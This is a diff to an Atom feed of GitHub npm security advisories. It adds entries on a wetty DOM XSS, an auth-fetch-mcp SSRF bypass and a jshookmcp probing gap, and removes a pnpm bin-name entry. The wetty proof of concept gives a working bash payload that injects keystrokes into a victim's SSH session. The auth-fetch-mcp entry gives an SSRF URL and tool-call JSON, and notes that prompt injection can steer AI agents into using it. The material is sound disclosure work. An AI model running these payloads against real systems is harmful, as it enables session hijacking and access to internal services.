@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-07-01T17:33:43.590Z</updated>
+    <updated>2026-07-01T18:34:34.318Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,379 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[wetty] wetty vulnerable to DOM XSS via file-download filename]]></title>
+        <id>https://github.com/advisories/GHSA-p26j-h7wj-r568</id>
+        <link href="https://github.com/advisories/GHSA-p26j-h7wj-r568"/>
+        <updated>2026-07-01T18:19:41.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The wetty client decodes a base64 filename from the file-download escape sequence and interpolates it raw into a Toastify HTML string (<code>escapeMarkup: false</code>). Any output the victim renders - a <code>cat</code>'d file, a tailed log, an SSH MOTD, a <code>curl</code> response - that contains <code>\x1b[5i...:...\x1b[4i</code> runs script in the wetty origin and types attacker-chosen keystrokes into the victim's SSH session.</p>
+<h3 id="preconditions">Preconditions</h3>
+<ul>
+<li>Victim has wetty open with an active SSH session.</li>
+<li>Attacker delivers the file-download escape sequence (<code>\x1b[5i&lt;b64-name&gt;:&lt;b64-content&gt;\x1b[4i</code>) into output the victim's terminal renders.</li>
+<li>Default configuration; no non-default flags required.</li>
+</ul>
+<h3 id="details">Details</h3>
+<pre><code class="language-typescript">// src/client/wetty.ts:37, 46-62
+const fileDownloader = new FileDownloader();
+// ...
+socket.on('data', (data: string) =&gt; {
+  const remainingData = fileDownloader.buffer(data);
+  // every PTY byte forwarded by the server passes through buffer()
+  // ...
+})
+</code></pre>
+<p>Every byte the server forwards from the PTY passes through <code>FileDownloader.buffer</code>. The buffer scans for the documented file-download markers <code>\x1b[5i</code> (begin) and <code>\x1b[4i</code> (end) - documented in <code>docs/downloading-files.md</code> - and, on a complete match, hands the inner payload to <code>onCompleteFile</code>.</p>
+<pre><code class="language-typescript">// src/client/wetty/download.ts:9-77
+function onCompleteFile(bufferCharacters: string): void {
+  let fileNameBase64;
+  let fileCharacters = bufferCharacters;
+  if (bufferCharacters.includes(':')) {
+    [fileNameBase64, fileCharacters] = bufferCharacters.split(':');
+  }
+  // ...
+  void detectAndDownload(bytes, fileCharacters, fileNameBase64);
+}
+
+async function detectAndDownload(/* ... */): Promise&lt;void&gt; {
+  // ...
+  let fileName;
+  try {
+    if (fileNameBase64 !== undefined) {
+      fileName = window.atob(fileNameBase64);            // attacker-controlled
+    }
+  } catch { /* ... */ }
+  fileName ??= `file-${ /* timestamp default */ }`;
+  // ...
+  Toastify({
+    text: `Download ready: &lt;a href="${blobUrl}" target="_blank" `
+        + `download="${fileName}"&gt;${fileName}&lt;/a&gt;`,     // sink
+    duration: 10000,
+    // ...
+    escapeMarkup: false,
+  }).showToast();
+}
+</code></pre>
+<p><code>fileName</code> is base64-decoded from the escape-sequence payload, then interpolated twice into a string that Toastify renders as raw HTML (<code>escapeMarkup: false</code>). No HTML escaping runs between <code>atob</code> and the toast markup. The wetty client exposes the live terminal as <code>window.wetty_term</code>, and <code>term.input(data, true)</code> (<code>src/client/wetty/term.ts:80, 93-97, 132, 145-198</code>) fires xterm.js's <code>onData</code>, which <code>src/client/wetty.ts:40-42</code> forwards as a socket <code>input</code> event - i.e., script in the wetty origin types into the victim's SSH session.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p><strong>Setup</strong></p>
+<ol>
+<li><p>Bring up wetty and its bundled SSH host from a fresh clone:</p>
+<pre><code class="language-bash">git clone https://github.com/butlerx/wetty
+cd wetty
+docker compose up -d
+sleep 5
+</code></pre>
+</li>
+<li><p>Open <code>http://localhost/wetty</code> in a browser. The login terminal prompts for a username (enter <code>term</code>) then proxies to <code>wetty-ssh</code>, which prompts for the SSH password (also <code>term</code>, set in <code>containers/ssh/Dockerfile</code>). The browser tab now holds a shell on the SSH container.</p>
+</li>
+</ol>
+<p><strong>Exploit</strong></p>
+<ol>
+<li><p>In the SSH session, build and emit the escape sequence. The filename portion carries the HTML payload; the content portion is a short literal so the toast renders quickly:</p>
+<pre><code class="language-bash">PAYLOAD='"&gt;&lt;img src=x onerror="window.wetty_term.input(\"id &gt; /tmp/pwned\\n\",true)"&gt;'
+FNAME_B64=$(printf '%s' "$PAYLOAD" | base64 -w0)
+DATA_B64=$(printf 'bait' | base64 -w0)
+printf '\x1b[5i%s:%s\x1b[4i' "$FNAME_B64" "$DATA_B64"
+</code></pre>
+<p>Expected: a Toastify notification appears at the bottom-right of the wetty page. Its DOM contains the attacker-supplied <code>&lt;img&gt;</code> element with the <code>onerror</code> handler.</p>
+</li>
+<li><p>The <code>onerror</code> handler calls <code>window.wetty_term.input("id &gt; /tmp/pwned\n", true)</code>, which xterm.js dispatches as a <code>data</code> event; <code>src/client/wetty.ts:40-42</code> forwards it as a socket <code>input</code> event; the server writes it to the PTY. The SSH host runs <code>id &gt; /tmp/pwned</code> as the connected user:</p>
+<pre><code class="language-bash">cat /tmp/pwned
+</code></pre>
+<p>Expected: <code>uid=1000(term) gid=1000(term) groups=1000(term)</code>.</p>
+</li>
+<li><p>The same chain works cross-user. On a shared SSH host, a low-privileged user plants the sequence in a file the higher-privileged user reads via wetty:</p>
+<pre><code class="language-bash"># As the low-priv user on the SSH host
+printf '\x1b[5i%s:%s\x1b[4i' "$FNAME_B64" "$DATA_B64" &gt; /tmp/notes.txt
+</code></pre>
+<p>When the higher-privileged user's wetty session runs <code>cat /tmp/notes.txt</code>, attacker-controlled JavaScript types commands into that user's shell.</p>
+</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Confidentiality:</strong> Reads the rendered terminal contents via <code>window.wetty_term.buffer.active</code>.</li>
+<li><strong>Integrity:</strong> Types attacker-chosen commands into the victim's SSH session via <code>window.wetty_term.input()</code>.</li>
+<li><strong>Auth:</strong> A writer of content the victim renders gains keystroke injection in the victim's higher-privileged session - a path from any local SSH user to commands as the wetty user.</li>
+</ul>
+<h3 id="suggestions-to-fix">Suggestions to fix</h3>
+<blockquote>
+<p><em>This has not been tested - it is illustrative only.</em></p>
+</blockquote>
+<p>HTML-escape the decoded filename before interpolating it into Toastify's HTML markup at <code>src/client/wetty/download.ts:67-77</code>.</p>
+<pre><code class="language-diff">   fileName ??= `file-${new Date()
+     .toISOString()
+     .split('.')[0]
+     .replace(/-/g, '')
+     .replace('T', '')
+     .replace(/:/g, '')}${fileExt ? `.${fileExt}` : ''}`;
++  const safeName = fileName.replace(/[&amp;&lt;&gt;"']/g, (c) =&gt;
++    ({ '&amp;': '&amp;amp;', '&lt;': '&amp;lt;', '&gt;': '&amp;gt;', '"': '&amp;quot;', "'": '&amp;#39;' })[c] ?? c,
++  );
+
+   const blob = new Blob([bytes.buffer as ArrayBuffer], { type: mimeType });
+   const blobUrl = URL.createObjectURL(blob);
+
+   Toastify({
+-    text: `Download ready: &lt;a href="${blobUrl}" target="_blank" download="${fileName}"&gt;${fileName}&lt;/a&gt;`,
++    text: `Download ready: &lt;a href="${blobUrl}" target="_blank" download="${safeName}"&gt;${safeName}&lt;/a&gt;`,
+     duration: 10000,
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/butlerx/wetty/security/advisories/GHSA-p26j-h7wj-r568">https://github.com/butlerx/wetty/security/advisories/GHSA-p26j-h7wj-r568</a></li>
+<li><a href="https://github.com/advisories/GHSA-p26j-h7wj-r568">https://github.com/advisories/GHSA-p26j-h7wj-r568</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p26j-h7wj-r568</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-01T18:19:39.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[auth-fetch-mcp] auth-fetch-mcp has SSRF Protection Bypass via IPv4-mapped IPv6 Loopback]]></title>
+        <id>https://github.com/advisories/GHSA-pvrj-8cg3-j5f8</id>
+        <link href="https://github.com/advisories/GHSA-pvrj-8cg3-j5f8"/>
+        <updated>2026-07-01T18:16:23.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="ssrf-protection-bypass-via-ipv4-mapped-ipv6-loopback">SSRF Protection Bypass via IPv4-mapped IPv6 Loopback</h2>
+<h3 id="summary">Summary</h3>
+<p><code>auth-fetch-mcp</code> v3.0.1 implements SSRF protection in <code>assertSafeUrl()</code> (<code>src/security.ts</code>) to block requests to private and loopback addresses. However, the <code>isPrivateV6()</code> function fails to detect IPv4-mapped IPv6 loopback addresses in their hex-normalized form. When an attacker supplies a URL such as <code>http://[::ffff:127.0.0.1]:PORT/</code>, the Node.js WHATWG URL parser silently normalizes the host to <code>[::ffff:7f00:1]</code>. Because <code>net.isIPv4('7f00:1')</code> returns <code>false</code>, the private-IP check is bypassed and the URL is passed to the browser or HTTP client, allowing the MCP tool to reach loopback services that are supposed to be blocked. The issue is exploitable under default configuration without any special environment variable and carries a CVSS v3.1 Base Score of <strong>7.4 (High)</strong>.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerable function is <code>isPrivateV6()</code> in <code>src/security.ts</code>, called from <code>assertSafeUrl()</code> which gates every outbound request made by the <code>auth_fetch</code> and <code>download_media</code> MCP tools.</p>
+<p><strong>Root cause — <code>src/security.ts:46-50</code>:</strong></p>
+<pre><code class="language-ts">if (lower.startsWith("::ffff:")) {
+  const v4 = lower.slice(7);          // "7f00:1" after Node normalization
+  if (net.isIPv4(v4)) return isPrivateV4(v4);  // false → falls through
+}
+return false;   // loopback escapes the guard
+</code></pre>
+<p>The Node.js WHATWG URL class (conforming to the URL Living Standard) hex-normalizes IPv4-mapped IPv6 addresses:</p>
+<table>
+<thead>
+<tr>
+<th>Input hostname</th>
+<th>After <code>new URL(...).hostname</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>::ffff:127.0.0.1</code></td>
+<td><code>::ffff:7f00:1</code></td>
+</tr>
+<tr>
+<td><code>::ffff:192.168.1.1</code></td>
+<td><code>::ffff:c0a8:101</code></td>
+</tr>
+</tbody></table>
+<p>After normalization, the suffix after <code>::ffff:</code> is no longer a dotted-decimal IPv4 string, so <code>net.isIPv4()</code> returns <code>false</code>. The guard falls through and <code>isPrivateV6()</code> returns <code>false</code>, causing <code>assertSafeUrl()</code> to treat a loopback address as safe.</p>
+<p><strong>Data flow — primary sink (<code>auth_fetch</code>):</strong></p>
+<ol>
+<li><code>src/tools.ts:119</code> — <code>auth_fetch</code> accepts user-controlled <code>url: z.string()</code> (source).</li>
+<li><code>src/tools.ts:128-131</code> — handler calls <code>navigateTo(ctx, url)</code>, passing the raw URL.</li>
+<li><code>src/browser.ts:58</code> — <code>navigateTo()</code> calls <code>assertSafeUrl(url)</code>.</li>
+<li><code>src/security.ts:74-108</code> — <code>assertSafeUrl()</code> delegates IPv6 host validation to <code>isPrivateV6()</code>; hex-normalized loopback bypasses the check.</li>
+<li><code>src/browser.ts:66</code> — <code>page.goto(safeUrl.toString())</code> issues a browser request to the internal address.</li>
+<li><code>src/extractor.ts:33-54</code> / <code>src/tools.ts:171-176</code> — page content is extracted and returned to the MCP caller.</li>
+</ol>
+<p><strong>Data flow — secondary sink (<code>download_media</code>):</strong></p>
+<ol>
+<li><code>src/tools.ts:198-210</code> — <code>download_media</code> accepts user-controlled <code>urls[]</code>.</li>
+<li><code>src/tools.ts:233-234</code> — each URL passes through <code>assertSafeUrl()</code> then <code>ctx.request.get(safeUrl.toString())</code>.</li>
+<li><code>src/tools.ts:253-254</code> — the response body is written to the local downloads directory and the path is returned.</li>
+</ol>
+<p><strong>Dynamic confirmation (Phase 2):</strong></p>
+<p>The PoC ran inside a Docker container (<code>--network=host</code>). Direct loopback URLs are correctly blocked:</p>
+<pre><code>[BASELINE-BLOCK] Refusing to fetch 127.0.0.1 (resolves to private/loopback/link-local address 127.0.0.1)
+[BASELINE-BLOCK] Refusing to fetch [::1] (resolves to private/loopback/link-local address ::1)
+</code></pre>
+<p>The IPv4-mapped IPv6 form bypasses the check and reaches the internal service:</p>
+<pre><code>[VULN] SECURITY_BYPASS: assertSafeUrl() did not throw
+[VULN] Input URL:       http://[::ffff:127.0.0.1]:31337/
+[VULN] Normalized URL:  http://[::ffff:7f00:1]:31337/
+[VULN] Cause: net.isIPv4('7f00:1') = false → isPrivateV6() returns false
+[SSRF] HTTP response received from internal service
+[CONFIRMED] SSRF_CONFIRMED: response contains INTERNAL_SECRET_MARKER
+[CONFIRMED] VULNERABILITY_REPRODUCED=TRUE
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p><strong>Prerequisites:</strong></p>
+<pre><code class="language-bash">git clone https://github.com/ymw0407/auth-fetch-mcp.git
+cd auth-fetch-mcp
+npm ci
+npm run build
+npx playwright install --with-deps chromium
+</code></pre>
+<p><strong>Terminal 1 — start a loopback-only internal service:</strong></p>
+<pre><code class="language-bash">node -e 'require("http").createServer((q,r)=&gt;r.end("&lt;h1&gt;INTERNAL_SECRET_MARKER&lt;/h1&gt;")).listen(31337,"127.0.0.1")'
+</code></pre>
+<p><strong>Terminal 2 — start the MCP server (default config, no special env vars):</strong></p>
+<pre><code class="language-bash">npx auth-fetch-mcp@3.0.1
+</code></pre>
+<p><strong>MCP tool invocation:</strong></p>
+<pre><code class="language-json">{
+  "tool": "auth_fetch",
+  "arguments": {
+    "url": "http://[::ffff:127.0.0.1]:31337/"
+  }
+}
+</code></pre>
+<p><strong>Expected vs. actual behavior:</strong></p>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>Expected</th>
+<th>Actual</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>http://127.0.0.1:31337/</code></td>
+<td>BLOCK</td>
+<td>BLOCK (correct)</td>
+</tr>
+<tr>
+<td><code>http://[::1]:31337/</code></td>
+<td>BLOCK</td>
+<td>BLOCK (correct)</td>
+</tr>
+<tr>
+<td><code>http://[::ffff:127.0.0.1]:31337/</code></td>
+<td>BLOCK</td>
+<td><strong>ALLOW</strong> (vulnerable)</td>
+</tr>
+<tr>
+<td><code>http://[::ffff:7f00:1]:31337/</code></td>
+<td>BLOCK</td>
+<td><strong>ALLOW</strong> (vulnerable)</td>
+</tr>
+</tbody></table>
+<p>After the user clicks the "Capture" button, the MCP response contains <code>INTERNAL_SECRET_MARKER</code>, confirming that the internal HTTP service was reached through the SSRF protection bypass.</p>
+<h3 id="remediation">Remediation</h3>
+<p>Decode the hex-encoded IPv4-mapped suffix before passing it to <code>isPrivateV4()</code>:</p>
+<pre><code class="language-diff"> if (lower.startsWith("::ffff:")) {
+   const v4 = lower.slice(7);
+   if (net.isIPv4(v4)) return isPrivateV4(v4);
++  const m = /^([0-9a-f]{1,4}):([0-9a-f]{1,4})$/.exec(v4);
++  if (m) {
++    const hi = parseInt(m[1], 16);
++    const lo = parseInt(m[2], 16);
++    const mapped = `${hi &gt;&gt; 8}.${hi &amp; 255}.${lo &gt;&gt; 8}.${lo &amp; 255}`;
++    return isPrivateV4(mapped);
++  }
+ }
+</code></pre>
+<p>Additionally, a <code>BrowserContext</code> route guard should be added in <code>src/browser.ts</code> to re-validate every navigation URL (including redirect targets) through <code>assertSafeUrl()</code>.</p>
+<p>No patched version available.</p>
+<h3 id="impact">Impact</h3>
+<p>This is a <strong>Server-Side Request Forgery (SSRF)</strong> vulnerability. An attacker who can supply or influence the <code>url</code> argument of the <code>auth_fetch</code> tool (or the <code>urls[]</code> array of <code>download_media</code>) can direct the MCP server to make HTTP requests to services bound to <code>127.0.0.1</code> or any other private IPv4 range, simply by encoding the target address as an IPv4-mapped IPv6 literal.</p>
+<p><strong>Who is impacted:</strong></p>
+<ul>
+<li><strong>End users</strong> running <code>auth-fetch-mcp</code> locally: an attacker who can inject tool arguments (e.g., via a prompt-injection payload in a webpage visited by the AI agent) can read the response from any HTTP service on the user's loopback interface — local dev servers, admin panels, credential endpoints, metadata services, or other MCP servers.</li>
+<li><strong>Server-side deployments</strong>: any deployment exposing <code>auth-fetch-mcp</code> as a shared MCP server faces the same risk against internal network services reachable from the host.</li>
+<li>The <code>auth_fetch</code> UI:R capture step is reflected in the CVSS score but does not eliminate the risk in prompt-injection scenarios, which the product's README explicitly identifies as an intended protection boundary.</li>
+</ul>
+<p>Confidentiality of internal service responses is fully compromised (C:H); integrity and availability of the target service are not directly affected by this issue.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/ymw0407/auth-fetch-mcp/security/advisories/GHSA-pvrj-8cg3-j5f8">https://github.com/ymw0407/auth-fetch-mcp/security/advisories/GHSA-pvrj-8cg3-j5f8</a></li>
+<li><a href="https://github.com/advisories/GHSA-pvrj-8cg3-j5f8">https://github.com/advisories/GHSA-pvrj-8cg3-j5f8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-pvrj-8cg3-j5f8</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-01T18:16:22.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@jshookmcp/jshook] @jshookmcp/jshook: ICMP probe and traceroute skip local-network SSRF authorization]]></title>
+        <id>https://github.com/advisories/GHSA-c5r6-m4mr-8q5j</id>
+        <link href="https://github.com/advisories/GHSA-c5r6-m4mr-8q5j"/>
+        <updated>2026-07-01T18:14:58.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The network domain has a central SSRF authorization policy that blocks private, loopback, link-local, and reserved targets unless an explicit authorization object allows private network access. The policy is enforced by raw HTTP/TCP/TLS RTT tools, but the ICMP probe and traceroute tools resolve the target and invoke the native ICMP/traceroute sink directly.</p>
+<p>An MCP client with access to an active network domain can therefore ask the jshookmcp server to probe internal addresses such as 10.0.0.1 even when local SSRF access is disabled for the other raw network tools. This exposes an internal reachability and route mapping primitive from the server network position.</p>
+<h2 id="affected-code">Affected code</h2>
+<p>Current main <a href="https://github.com/vmoranv/jshookmcp/commit/d309c395738638e384c28c0f599b47b2213ab595">https://github.com/vmoranv/jshookmcp/commit/d309c395738638e384c28c0f599b47b2213ab595</a> and npm package @jshookmcp/jshook 0.3.1 both contain the issue.</p>
+<ul>
+<li>src/server/domains/network/handlers/raw-latency-handlers.ts:61-66: network_rtt_measure parses optional authorization and calls resolveAuthorizedTransportTarget before probing.</li>
+<li>src/server/domains/network/handlers/raw-latency-handlers.ts:185-190: network_latency_stats uses the same authorization guard.</li>
+<li>src/server/domains/network/handlers/raw-latency-handlers.ts:123-139: network_traceroute resolves target with resolveHostname and calls traceroute without an authorization policy check.</li>
+<li>src/server/domains/network/handlers/raw-latency-handlers.ts:240-257: network_icmp_probe resolves target with resolveHostname and calls icmpProbe without an authorization policy check.</li>
+<li>src/server/domains/network/handlers/raw-latency-handlers.ts:408-416: resolveHostname returns IPv4 literals directly and otherwise performs DNS A lookup without checking private, loopback, link-local, or reserved ranges.</li>
+<li>src/utils/network/ssrf-policy.ts:244-316: the central policy blocks private targets unless explicit authorization or ALLOW_LOCAL_SSRF=true is set.</li>
+</ul>
+<h2 id="reproduction">Reproduction</h2>
+<p>Used a focused regression test against the real handleCallTool and RawHandlers call path with fake native ICMP and policy sinks. The test does not send external traffic. It proves the denied control and the bypass through the same MCP meta-tool dispatch path.</p>
+<p>Test file path in my local checkout:</p>
+<pre><code class="language-text">tests/server/security/jshookmcp-network-meta-boundary.test.ts
+</code></pre>
+<p>Relevant test body:</p>
+<pre><code class="language-ts">it('denied control: RTT path consults the SSRF authorization guard for private targets', async () =&gt; {
+  const handler = new RawHandlers();
+  state.resolveAuthorizedTransportTarget.mockRejectedValue(new Error('RTT measurement blocked: target resolves to a private or reserved address.'));
+  await expect(handler.handleNetworkRttMeasure({ url: 'https://10.0.0.1/', probeType: 'tcp' })).rejects.toThrow(/blocked/);
+  expect(state.resolveAuthorizedTransportTarget).toHaveBeenCalled();
+  expect(state.icmpProbe).not.toHaveBeenCalled();
+});
+
+it('bypass proof: call_tool can drive network_icmp_probe to a private IP without the SSRF authorization guard', async () =&gt; {
+  const raw = new RawHandlers();
+  const ctx = {
+    router: { has: vi.fn((name: string) =&gt; name === 'network_icmp_probe') },
+    executeToolWithTracking: vi.fn((name: string, args: Record&lt;string, unknown&gt;) =&gt; raw.handleNetworkIcmpProbe(args)),
+  } as any;
+
+  const response = await handleCallTool(ctx, { name: 'network_icmp_probe', args: { target: '10.0.0.1', ttl: 64 } });
+  const body = JSON.parse(response.content[0].text);
+
+  expect(body.success).toBe(true);
+  expect(ctx.router.has).toHaveBeenCalledWith('network_icmp_probe');
+  expect(ctx.executeToolWithTracking).toHaveBeenCalledWith('network_icmp_probe', { target: '10.0.0.1', ttl: 64 });
+  expect(state.resolveAuthorizedTransportTarget).not.toHaveBeenCalled();
+  expect(state.icmpProbe).toHaveBeenCalledWith(expect.objectContaining({ target: '10.0.0.1', ttl: 64 }));
+});
+</code></pre>
+<p>Command run:</p>
+<pre><code class="language-bash">corepack pnpm exec vitest run --config vitest.config.ts tests/server/security/jshookmcp-network-meta-boundary.test.ts --reporter=verbose
+</code></pre>
+<p>Result:</p>
+<pre><code class="language-text">Test Files  1 passed (1)
+Tests       4 passed (4)
+</code></pre>
+<p>The observed vulnerable call sequence is:</p>
+<pre><code class="language-text">call_tool(name=network_icmp_probe, args={target: 10.0.0.1, ttl: 64})
+  -&gt; ctx.router.has(network_icmp_probe) == true
+  -&gt; ctx.executeToolWithTracking(network_icmp_probe, validatedArgs)
+  -&gt; RawHandlers.handleNetworkIcmpProbe(validatedArgs)
+  -&gt; resolveHostname(10.0.0.1) returns 10.0.0.1
+  -&gt; icmpProbe({ target: 10.0.0.1, ttl: 64, ... })
+</code></pre>
+<p>resolveAuthorizedTransportTarget is not called on this path. The same missing policy pattern exists for network_traceroute.</p>
+<h2 id="impact">Impact</h2>
+<p>An MCP client with access to the active network domain can use the server as a backend-origin internal network probing oracle. The result can reveal whether internal hosts respond, approximate latency, traceroute hops, and ICMP error classes from the server network position.</p>
+<p>The practical impact is strongest when jshookmcp is exposed over Streamable HTTP or another remote transport, multiple clients share one server, or the server runs on Windows or with raw socket capability. This is not code execution and does not by itself exfiltrate response bodies.</p>
+<h2 id="remediation">Remediation</h2>
+<p>Apply the same authorization model used by network_rtt_measure and network_latency_stats to network_icmp_probe and network_traceroute. In particular, accept an optional authorization object, resolve the target through the central policy helper or an equivalent host-only policy helper, block private and reserved ranges by default, and pass only the policy-approved resolved address to the native probe. Add regression tests for default-denied private targets, authorized private CIDR access, private hostnames, and call_tool dispatch.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vmoranv/jshookmcp/security/advisories/GHSA-c5r6-m4mr-8q5j">https://github.com/vmoranv/jshookmcp/security/advisories/GHSA-c5r6-m4mr-8q5j</a></li>
+<li><a href="https://github.com/advisories/GHSA-c5r6-m4mr-8q5j">https://github.com/advisories/GHSA-c5r6-m4mr-8q5j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c5r6-m4mr-8q5j</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-01T18:14:57.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[tinymce] TinyMCE Cross-Site Scripting (XSS) vulnerability using media plugin `data-mce-object` injection]]></title>
         <id>https://github.com/advisories/GHSA-vg35-5wq7-3x7w</id>
@@ -1133,427 +1506,5 @@ MERGED as 65443f4bdf
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-06-26T23:54:52.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pnpm] pnpm: Reserved bin name deletes PNPM_HOME during global remove]]></title>
-        <id>https://github.com/advisories/GHSA-4gxm-v5v7-fqc4</id>
-        <link href="https://github.com/advisories/GHSA-4gxm-v5v7-fqc4"/>
-        <updated>2026-06-26T23:46:53.000Z</updated>
-        <content type="html"><![CDATA[<details>
-<summary>Maintainer Action Plan</summary>
-
-<h2 id="maintainer-action-plan">Maintainer Action Plan</h2>
-<p>This report is ready to review with the shared patch branch. Start with the PR and the expected fixed behavior, then use the detailed exploit narrative below only if you want to replay the original path.</p>
-<ul>
-<li>Advisory: <code>CAND-PNPM-085</code> / <code>GHSA-4gxm-v5v7-fqc4</code></li>
-<li>Advisory URL: <a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-4gxm-v5v7-fqc4">https://github.com/pnpm/pnpm/security/advisories/GHSA-4gxm-v5v7-fqc4</a></li>
-<li>Shared patch PR: <a href="https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1">https://github.com/pnpm/pnpm-ghsa-j2hc-m6cf-6jm8/pull/1</a></li>
-<li>Shared patch branch: <code>security/ghsa-batch-2026-06-09</code></li>
-<li>Patch commit: <code>a93449314f398cf4bdf2e28d033c02d37395ad22</code></li>
-<li>Base commit: <code>origin/main</code> <code>55a4035abf1ae3fe7208ba1f5ef43c5eff58ccec</code></li>
-<li>Maintainer priority: <code>appendix</code></li>
-<li>Component: <code>pnpm global add/remove bin cleanup</code></li>
-<li>Patch area: bin name/path segment validation</li>
-<li>Affected packages: <code>npm:pnpm</code></li>
-<li>CWE IDs: <code>CWE-22</code>, <code>CWE-73</code></li>
-<li>Conservative CVSS: <code>6.5</code> / <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></li>
-<li>Next action: review the shared patch branch for this component, set the final affected version range, merge and release the fix, then publish or close the advisory.</li>
-</ul>
-<h3 id="expected-patched-behavior">Expected Patched Behavior</h3>
-<p>Reserved, dot, and path-segment bin names are rejected or ignored; global remove leaves <code>PNPM_HOME</code> and the sentinel file intact.</p>
-<h3 id="files-and-tests-to-review">Files And Tests To Review</h3>
-<ul>
-<li><code>bins/resolver/src/index.ts</code></li>
-<li><code>bins/resolver/test/index.ts</code></li>
-<li><code>global/commands/test/globalRemove.test.ts</code></li>
-<li><code>pacquet/crates/cmd-shim/src/bin_resolver.rs</code></li>
-<li><code>pacquet/crates/cmd-shim/src/bin_resolver/tests.rs</code></li>
-<li><code>.changeset/strange-bin-segments.md</code></li>
-</ul>
-<h3 id="focused-validation">Focused Validation</h3>
-<p>Run these from a checkout of the shared patch branch. They are the useful maintainer commands with machine-local artifact paths removed.</p>
-<ul>
-<li>Use the private PR checks plus the patched replay coverage matrix for this candidate.</li>
-</ul>
-<p>The full patched replay for the shared branch passed with all 20 candidates marked fixed. This candidate's replay evidence is <code>results/CAND-PNPM-085-patched-result.json</code>.</p>
-
-
-<h2>Title</h2>
-<p>Reserved manifest bin names can make global package operations delete outside the global bin directory</p>
-</details>
-
-<h2 id="description">Description</h2>
-<h3 id="summary">Summary</h3>
-<p>Manifest <code>bin</code> object keys such as <code>""</code>, <code>"."</code>, and <code>".."</code> passed pnpm's bin-name guard. When a malicious package was installed globally, later global remove, update, or add-replacement flows could re-derive those names from the installed manifest and pass <code>path.join(globalBinDir, binName)</code> to <code>removeBin</code>. For <code>"."</code> this targets the global bin directory; for <code>".."</code> this targets its parent.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerable dataflow was:</p>
-<ul>
-<li><code>bins/resolver/src/index.ts</code> converted manifest <code>bin</code> object keys to <code>binName</code> and only required URL-safe text or <code>$</code>. Empty, dot, dot-dot, and scoped forms such as <code>@scope/..</code> were not rejected after scope stripping.</li>
-<li><code>global/packages/src/scanGlobalPackages.ts</code> scanned installed global package manifests and returned manifest-derived <code>bin.name</code> values.</li>
-<li><code>global/commands/src/globalRemove.ts</code>, <code>global/commands/src/globalUpdate.ts</code>, and global add replacement logic joined those names to <code>globalBinDir</code>.</li>
-<li><code>bins/remover/src/removeBins.ts</code> recursively removed the resulting path.</li>
-</ul>
-<p>Install-time checks did not close the gap: bin target paths were package-root checked, conflict checks looked at the same escaped path but did not reject reserved segments, and bin-link warning paths could leave the package installed for later global operations.</p>
-<h3 id="poc">PoC</h3>
-<p>Run:</p>
-<p>The script first performs a safe prepatch simulation in a temporary directory:</p>
-<pre><code class="language-text">prepatch_reserved_bin_name=..
-prepatch_delete_target=/.../cand-pnpm-085.XXXXXX/home
-prepatch_deleted_global_bin_parent=true
-</code></pre>
-<p>It then validates the patched implementation:</p>
-<pre><code class="language-bash">./node_modules/.bin/tsgo --build bins/resolver/tsconfig.json
-./node_modules/.bin/tsgo --build global/commands/tsconfig.json
-./node_modules/.bin/eslint bins/resolver/src/index.ts bins/resolver/test/index.ts global/commands/test/globalRemove.test.ts
-cd bins/resolver
-NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/index.ts --runInBand
-cd global/commands
-NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/globalRemove.test.ts -t "global remove ignores reserved manifest bin names" --runInBand
-cargo fmt --manifest-path pacquet/crates/cmd-shim/Cargo.toml --check
-cargo test --manifest-path pacquet/crates/cmd-shim/Cargo.toml bin_resolver --lib
-git diff --check -- bins/resolver global/commands/test/globalRemove.test.ts pacquet/crates/cmd-shim .changeset/strange-bin-segments.md pnpm-lock.yaml
-</code></pre>
